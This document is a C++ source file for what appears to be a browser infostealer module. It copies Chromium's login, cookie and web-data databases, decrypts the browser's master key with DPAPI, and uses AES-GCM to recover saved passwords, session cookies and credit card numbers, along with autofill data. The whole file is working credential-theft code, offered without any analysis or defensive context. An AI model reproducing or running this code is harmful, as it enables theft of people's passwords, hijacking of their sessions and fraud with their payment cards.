#include "Decrypt.h"
bool ChromiumDecryptor::init()
{
	std::string path = AppData + "\\" + this->databasePath + "\\";
	LoginDataPath = path + "LoginDataCopy";
	CookiesDataPath = path + "Network\\CookiesCopy";
	WebDataPath = path + "WebDataCopy";

	if (this->InitSuccess)
		return true;

	{
		std::ifstream src(path + "Login Data", std::ios::binary);
		std::ofstream dst(LoginDataPath, std::ios::binary);
		dst << src.rdbuf();
	}

	{
		std::ifstream src(path + "Network\\Cookies", std::ios::binary);
		std::ofstream dst(CookiesDataPath, std::ios::binary);
		dst << src.rdbuf();
	}

	{
		std::ifstream src(path + "Web Data", std::ios::binary);
		std::ofstream dst(WebDataPath, std::ios::binary);
		dst << src.rdbuf();
	}

	if (sqlite3_open(CookiesDataPath.c_str(), &db_Cookie) || sqlite3_open(LoginDataPath.c_str(), &db_Login) || sqlite3_open(WebDataPath.c_str(), &db_WebData))
	{
		sqlite3_close(db_Cookie);
		sqlite3_close(db_Login);
		sqlite3_close(db_WebData);
		std::remove(CookiesDataPath.c_str());
		std::remove(LoginDataPath.c_str());
		std::remove(WebDataPath.c_str());
		return false;
	}

	this->InitSuccess = retrieveEncryptionKey();
	return InitSuccess;
}
bool ChromiumDecryptor::retrieveEncryptionKey()
{
	std::ifstream file(AppData + "\\"+localStatePath);

	if (file.is_open()) {
		std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
		auto json = nlohmann::json::parse(contents);
		if (json.contains("os_crypt"))
			if (json["os_crypt"].contains("encrypted_key"))
			{
				std::string key = Base64::decode(json["os_crypt"]["encrypted_key"]);
				key = key.substr(5);//remove DPAPI text from encrypted_key
				DATA_BLOB encrypted_data;
				encrypted_data.pbData = (BYTE*)&key[0];
				encrypted_data.cbData = (DWORD)(key.size() + 1);
				DATA_BLOB decrypted_data;
				BOOL result = CryptUnprotectData(&encrypted_data, nullptr, nullptr, nullptr, nullptr, 0, &decrypted_data);
				if (result) {
					this->aesKey = std::string(reinterpret_cast<char const*>(decrypted_data.pbData), decrypted_data.cbData);

					return true;
				}

			}
	}
	return false;
}
std::vector<ChromiumDecryptor::PasswordEntry> ChromiumDecryptor::getPassword()
{
	std::vector<ChromiumDecryptor::PasswordEntry> response;
	if (!InitSuccess || aesKey.empty()) {
		throw std::runtime_error("Failed to get Password");
	}
	sqlite3_stmt* stmt;
	if (sqlite3_prepare(db_Login, "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created", -1, &stmt, 0) == SQLITE_OK) {
		while (sqlite3_step(stmt) == SQLITE_ROW) {
			std::string passStr(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)), sqlite3_column_bytes(stmt, 3));
			std::string iv = passStr.substr(3, 12);
			std::string ciphertext = passStr.substr(15);
			ChromiumDecryptor::PasswordEntry passwordEntry;
			passwordEntry.URL = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
			passwordEntry.Username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
			passwordEntry.Password = AesDecrypt(ciphertext, aesKey, iv);;
			response.push_back(passwordEntry);
		}
	}
	else {
		throw std::runtime_error("Failed to prepare SQL statement");
	}
	return response;
}
std::vector<ChromiumDecryptor::CookieEntry> ChromiumDecryptor::getCookie()
{
	std::vector<ChromiumDecryptor::CookieEntry> response;
	if (!InitSuccess || aesKey.empty()) {
		throw std::runtime_error("Failed to get Cookie");
	}

	sqlite3_stmt* stmt;
	if (sqlite3_prepare(db_Cookie, "select host_key, name, value, encrypted_value, path from cookies order by creation_utc", -1, &stmt, 0) == SQLITE_OK) {
		while (sqlite3_step(stmt) == SQLITE_ROW) {
			std::string value(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)), sqlite3_column_bytes(stmt, 3));
			std::string iv = value.substr(3, 12);
			std::string ciphertext = value.substr(15);
			ChromiumDecryptor::CookieEntry cookieEntry;
			cookieEntry.URL = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
			cookieEntry.Name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
			cookieEntry.Value = AesDecrypt(ciphertext, aesKey, iv);
			response.push_back(cookieEntry);
		}
	}
	else {
		throw std::runtime_error("Failed to prepare SQL statement");
	}
	return response;
}
std::vector<ChromiumDecryptor::AutoFillEntry> ChromiumDecryptor::getAutoFill()
{
	std::vector<ChromiumDecryptor::AutoFillEntry> Response;
	if (!InitSuccess || aesKey.empty())
		throw std::runtime_error("Failed to get AutoFill");
	sqlite3_stmt* stmt;
	if (sqlite3_prepare(db_WebData, "SELECT name, value FROM autofill ORDER BY date_created", -1, &stmt, 0) == SQLITE_OK)
	{
		while (sqlite3_step(stmt) == SQLITE_ROW)
		{
			ChromiumDecryptor::AutoFillEntry entry;
			entry.Name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
			entry.Value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
			Response.push_back(entry);
		}
		sqlite3_finalize(stmt);
	}
	else {
		throw std::runtime_error("Failed to prepare SQL statement");
	}
	return Response;
}
std::vector<ChromiumDecryptor::CreditCardEntry> ChromiumDecryptor::getCreditCard() {
	if (!InitSuccess || aesKey.empty()) {
		throw std::runtime_error("Failed to get CreditCard");
	}

	std::vector<ChromiumDecryptor::CreditCardEntry> Response;
	sqlite3_stmt* stmt;
	if (sqlite3_prepare(db_WebData, "select name_on_card, expiration_year, expiration_month, card_number_encrypted from credit_cards order by date_modified", -1, &stmt, 0) == SQLITE_OK) {
		while (sqlite3_step(stmt) == SQLITE_ROW) {
			ChromiumDecryptor::CreditCardEntry _CreditCardEntry;
			std::string encryptedCardNumber(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)), sqlite3_column_bytes(stmt, 3));
			std::string iv = encryptedCardNumber.substr(3, 12);
			std::string ciphertext = encryptedCardNumber.substr(15);
			_CreditCardEntry.NameOnCard = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
			_CreditCardEntry.Year = sqlite3_column_int(stmt, 1);
			_CreditCardEntry.Month = sqlite3_column_int(stmt, 2);
			_CreditCardEntry.CardNumber = AesDecrypt(ciphertext, aesKey, iv);
			Response.push_back(_CreditCardEntry);
		}
		sqlite3_finalize(stmt);
	}
	else {
		throw std::runtime_error("Failed to prepare SQL statement");
	}
	return Response;
}
std::string ChromiumDecryptor::AesDecrypt(const std::string& ciphertext, const std::string& key, const std::string& iv) {
	std::string decrypted;
	CryptoPP::GCM<CryptoPP::AES>::Decryption gcmDecryption;
	gcmDecryption.SetKeyWithIV(reinterpret_cast<const byte*>(key.data()), key.size(), reinterpret_cast<const byte*>(iv.data()), iv.size());
	CryptoPP::AuthenticatedDecryptionFilter decryptionFilter(gcmDecryption, new CryptoPP::StringSink(decrypted));
	decryptionFilter.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
	decryptionFilter.MessageEnd();
	return decrypted;
}